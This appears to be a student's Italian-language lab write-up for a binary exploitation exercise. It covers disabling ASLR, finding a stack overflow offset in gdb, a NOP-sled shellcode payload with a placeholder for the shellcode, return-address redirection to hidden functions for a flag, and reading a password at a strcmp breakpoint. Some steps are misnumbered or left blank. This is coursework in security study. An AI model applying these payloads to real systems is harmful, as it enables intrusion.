# Nome: Davide Chirichella
# Matricola: 0001071414
# Esercizio: binary exploitation

# ==============================================================================

0. Aggiungo i permessi di esecuzione al file e disabilito l'ASLR:

$ chmod +x ./file
sudo -i -> echo 0 > /proc/sys/kernel/randomize_va_space

1. Apro il binario con gdb per analizzare il comportamento del programma.
Faccio una run "pulita" dando in input una stringa breve. Il programma 
sembra prendere quindi una stringa da standard input e stamparla.

gdb ./file -> run "ciao"

2. Inizio provando a inviare input molto lunghi per provare a "rompere" il buffer 
e sovrascrivere l'indirizzo di ritorno:
    run $(perl -e 'print "A"x50')  # esce normalmente  
    run $(perl -e 'print "A"x100') # indirizzo sovrascritto a 41414141
    run $(perl -e 'print "A"x75') # indirizzo sovrascritto a 41414141
    ---
    run $(perl -e 'print "A"x n') # indirizzo sovrascritto a 00414141
    run $(perl -e 'print "A"x n+1') # indirizzo sovrascritto a 41414141

Si scopre dunque che il buffer è lungo esattamente x-4 e che è possibile sovrascrivere 
l'indirizzo di ritorno in questo modo:

        run $(perl -e 'print "A"x , "BBBB" ') # indirizzo sovrascritto a 42424242

# Shellcode --------------------------------------------------------------------

4. Per eseguire lo shellcode è opportuno usare al posto delle A, dei NOP che non fanno nulla
se non far semplicemente "scivolare" l'esecuzione fino al codice malevolo

5. Analizzo con 'x/200xw $esp' la memoria a runtime per trovare un indirizzo valido dove risiedeva 
il buffer con  i NOP e lo shellcode. In particolare, è opportuno scegliere una cella il cui contenuto 
è stato modificato dal nostro input malevolo.

    Ad esempio, ho trovato l’indirizzo 0xffffd130 

    ricordando che il formato usato è little endian, quello in cui i byte meno significativi sono memorizzati per primi
    L'indirizzo da scrivere è: '\x30\xd1\xff\xff'
    
6. Calcolo la lunggezza dello shellcode (in shellcode.txt) con il rapido comando
	
	grep -o '\\x' shellcode.txt | wc -l
	
	oppure
	
	echo $(( $(cat shellcode.txt | wc -c) / 4 ))    

6. Poichè lo shellcode è lungo 45 byte, il payload finale da costruire avrà:

- Buffer da 622 byte, di cui 577 di NOP e 45 di shellcode
- 4 byte per l'indirizzo di ritorno

perl -e 'print "\x90"x577 . "<SHELLCODE>" . "\x30\xd1\xff\xff"'

7. Il payload finale risulta quindi essere:


# Funzione segreta -------------------------------------------------------------

3. Tramite il comando info functions posso analizzare le funzioni presenti con i rispettivi indirizzi
Per trovare la flag sarà sufficiente appuntarsi l'indirizzo della funzione da eseguire e scriverlo in little endian
al posto delle BBBB con cui sovrascrivevamo l'indirizzo.
Le funzioni con un nome sospetto risultano essere:

0x565561ad  super_secret
0x56556300  super_function
0x56556450  secret_function
0x565565aa  super_hidden
0x56556724  super_senza_piombo
0x56556877  secret

4. Ricordando che il formato usato è little endian, quello in cui i byte meno significativi sono memorizzati per primi,
i payload malevoli da scrivere saranno: 

run $(perl -e 'print "A"x16, "\xad\x61\x55\x56"') 
OUTPUT: {flag}

[...]

# Trovare la password ----------------------------------------------------------

1. Disassemblo la funzione per ottenere tutti gli indirizzi
	disas [funzione, in questo caso check]
	
2. Metto dei breakpoint ad ogni riga "utile" prima della
   strcmp ad esempio:
   
	b *0x080491c7
	b *0x080491b7
	...
	
3. Faccio una run "pulita"
	run test
	
4. Controllo il valore del registro utile, in questo caso eax, con
	x/s $eax

5. Se stampa la password, bene, altrimenti, per andare al prossimo breakpoint

	continue

E poi torno al punto 4


# ==============================================================================
